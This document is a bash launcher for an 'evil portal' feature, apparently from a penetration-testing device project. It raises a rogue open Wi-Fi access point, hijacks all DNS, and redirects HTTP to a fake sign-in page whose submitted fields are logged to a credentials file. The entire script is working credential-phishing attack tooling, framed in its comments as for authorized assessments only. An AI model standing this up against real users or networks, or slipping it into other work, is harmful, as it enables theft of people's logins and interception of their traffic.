#!/bin/bash
# Kestrel-Unleashed evil-portal launcher: the ExecStart for
# kestrel-evil-portal.service. Stands up a generic captive-portal rogue AP on
# the external USB dongle for an AUTHORIZED assessment:
#
#   * puts the capture dongle into AP mode (hostapd) with the configured SSID,
#     pausing kestrel-capture for the duration (one radio, one job),
#   * hands out DHCP and answers ALL DNS to ourselves (dnsmasq), so any client
#     name-resolves to the portal,
#   * redirects :80 to the portal server (run as pi on :8880),
#   * runs the portal (kestrel_pi.evilportal) serving the operator's template
#     and logging every submitted field.
#
# Everything is torn down and capture restarted on exit (EXIT/INT/TERM trap).
# Exits 0 (not a failure) when evil-portal is disabled or no AP-capable dongle
# is present, so the unit never crash-loops. Lab / authorized use only; the
# `kestrel evil-portal` CLI takes the authorized-use acknowledgment before it
# ever starts this. See docs/user-guide/evil-portal.md.
#
# NOTE: not yet validated end-to-end on hardware (see docs/developer/deferred.md).
set -euo pipefail
# shellcheck source=common.sh
. "${PWN_LIB_DIR:-/usr/local/lib/kestrel}/common"

PORTAL_PORT=8880
SHARE_TEMPLATES=/usr/local/share/kestrel/evil-portal/templates
ETC_TEMPLATES=/etc/kestrel/evil-portal/templates

enabled=$(cfg evil-portal.enabled false)
if [ "$enabled" != true ]; then
    log "evil-portal: disabled in config; nothing to do"
    exit 0
fi

ssid=$(cfg evil-portal.ssid "Guest WiFi")
channel=$(cfg evil-portal.channel 1)
portal_ip=$(cfg evil-portal.portal_ip 10.0.0.1)
dhcp_start=$(cfg evil-portal.dhcp_start 10.0.0.10)
dhcp_end=$(cfg evil-portal.dhcp_end 10.0.0.250)

# Template selection, most specific first:
#   1. the active operator PROFILE (`[evil-portal] profile`), a named portal
#      with its own sign-in page under the profiles dir,
#   2. a bare operator override in $ETC_TEMPLATES (legacy single-portal path),
#   3. the shipped neutral defaults.
profile=$(cfg evil-portal.profile "")
profile_dir="$PWN_EVIL_PORTAL_PROFILES_DIR/$profile"
if [ -n "$profile" ] && [ -f "$profile_dir/index.html" ]; then
    tmpl_dir=$profile_dir
elif [ -f "$ETC_TEMPLATES/index.html" ]; then
    tmpl_dir=$ETC_TEMPLATES
else
    tmpl_dir=$SHARE_TEMPLATES
fi
creds="$PWN_EVIL_PORTAL_DIR/creds.jsonl"
mkdir -p "$PWN_EVIL_PORTAL_DIR"

iface=$(capture_resolve_iface "$(cfg capture.interface auto)") || {
    log "evil-portal: no AP-capable USB dongle found; exiting"
    exit 0
}

# Pause capture so the dongle is ours.
capture_was_active=no
if systemctl is-active --quiet "$PWN_CAPTURE_SERVICE"; then
    capture_was_active=yes
    log "evil-portal: pausing capture"
    systemctl stop "$PWN_CAPTURE_SERVICE" 2>/dev/null || true
fi

run_dir=$(mktemp -d /run/kestrel-evil-portal.XXXXXX)
hostapd_pid=""
dnsmasq_pid=""
portal_pid=""

cleanup() {
    log "evil-portal: tearing down"
    [ -n "$portal_pid" ] && kill "$portal_pid" 2>/dev/null || true
    [ -n "$dnsmasq_pid" ] && kill "$dnsmasq_pid" 2>/dev/null || true
    [ -n "$hostapd_pid" ] && kill "$hostapd_pid" 2>/dev/null || true
    iptables -t nat -D PREROUTING -i "$iface" -p tcp --dport 80 \
        -j REDIRECT --to-ports "$PORTAL_PORT" 2>/dev/null || true
    ip addr flush dev "$iface" 2>/dev/null || true
    ip link set "$iface" down 2>/dev/null || true
    rm -f "$PWN_EVIL_PORTAL_DIR/iface" 2>/dev/null || true
    rm -rf "$run_dir" 2>/dev/null || true
    if [ "$capture_was_active" = yes ]; then
        log "evil-portal: restarting capture"
        systemctl start --no-block "$PWN_CAPTURE_SERVICE" 2>/dev/null || true
    fi
}
trap cleanup EXIT INT TERM

# Keep NetworkManager off the dongle while we own it.
nmcli device set "$iface" managed no 2>/dev/null || true

# Record the active interface so `kestrel evil-portal status` can inspect the
# same one the launcher chose (it is in AP mode now, so re-resolving is unsafe).
printf '%s\n' "$iface" > "$PWN_EVIL_PORTAL_DIR/iface" 2>/dev/null || true

cat > "$run_dir/hostapd.conf" <<EOF
interface=$iface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
auth_algs=1
ignore_broadcast_ssid=0
wmm_enabled=1
EOF
# Optional regulatory domain: some dongles only bring the AP up (or only allow
# the chosen channel) with a country set. Off by default so it can't break a
# dongle that already associates; set `evil-portal.country` to enable.
country=$(cfg evil-portal.country "")
if [ -n "$country" ]; then
    printf 'country_code=%s\nieee80211d=1\n' "$country" >> "$run_dir/hostapd.conf"
fi

cat > "$run_dir/dnsmasq.conf" <<EOF
interface=$iface
bind-interfaces
except-interface=lo
dhcp-range=$dhcp_start,$dhcp_end,255.255.255.0,12h
dhcp-option=option:router,$portal_ip
dhcp-option=option:dns-server,$portal_ip
dhcp-authoritative
dhcp-leasefile=$PWN_EVIL_PORTAL_DIR/leases
address=/#/$portal_ip
no-resolv
no-hosts
EOF

# Pre-clean the interface, then start hostapd FIRST. Order matters: putting the
# radio into AP mode resets the interface, which FLUSHES any IP assigned
# beforehand -- the classic "the AP broadcasts and clients associate, but
# nothing at 10.0.0.1 ever answers" failure. So we bring the AP up, confirm it,
# and only then put the portal IP on the interface.
ip link set "$iface" down 2>/dev/null || true
ip addr flush dev "$iface" 2>/dev/null || true

log "evil-portal: starting hostapd (SSID '$ssid' ch $channel on $iface)"
hostapd "$run_dir/hostapd.conf" & hostapd_pid=$!

# Wait for hostapd to actually enter AP mode; fail fast if it dies (a dongle
# that can't do AP mode), rather than standing up a dead portal that looks live.
ap_ready=no
for _ in $(seq 1 20); do
    if ! kill -0 "$hostapd_pid" 2>/dev/null; then
        die "evil-portal: hostapd exited during startup -- the dongle may not support AP mode"
    fi
    if iw dev "$iface" info 2>/dev/null | grep -q 'type AP'; then
        ap_ready=yes
        break
    fi
    sleep 0.5
done
if [ "$ap_ready" != yes ]; then
    log "evil-portal: WARNING hostapd not confirmed in AP mode after 10s; continuing anyway"
fi

# Now assign the portal IP (after the AP-mode switch, so it sticks) and PROVE it
# landed -- without this address the box is unreachable at $portal_ip and every
# client sees "connected, no internet" with a portal that never opens.
ip addr replace "$portal_ip/24" dev "$iface"
ip link set "$iface" up
if ! ip -4 addr show dev "$iface" | grep -q "inet $portal_ip/"; then
    die "evil-portal: could not put $portal_ip on $iface (interface reset by hostapd?)"
fi
log "evil-portal: $portal_ip is up on $iface"

# Redirect inbound HTTP to the portal (run unprivileged on :8880). We do NOT
# redirect :443 -- there is no cert, so a TLS probe simply fails, which is fine;
# captive-portal detection uses plain HTTP.
iptables -t nat -A PREROUTING -i "$iface" -p tcp --dport 80 \
    -j REDIRECT --to-ports "$PORTAL_PORT"

dnsmasq --keep-in-foreground --conf-file="$run_dir/dnsmasq.conf" & dnsmasq_pid=$!
# The portal HTTP server runs as pi (the creds dir is pi-owned); -I keeps a
# stray module in the cwd from shadowing the stdlib.
run_as_pi "$PWN_VENV_PYTHON" -I -m kestrel_pi.evilportal \
    "$tmpl_dir" "$creds" 0.0.0.0 "$PORTAL_PORT" "$portal_ip" & portal_pid=$!
log "evil-portal: portal serving on $portal_ip:$PORTAL_PORT (:80 redirected); templates: $tmpl_dir"

# Run until any of the three exits (or the unit is stopped); the trap cleans up.
wait -n "$hostapd_pid" "$dnsmasq_pid" "$portal_pid"
log "evil-portal: a component exited; shutting down"
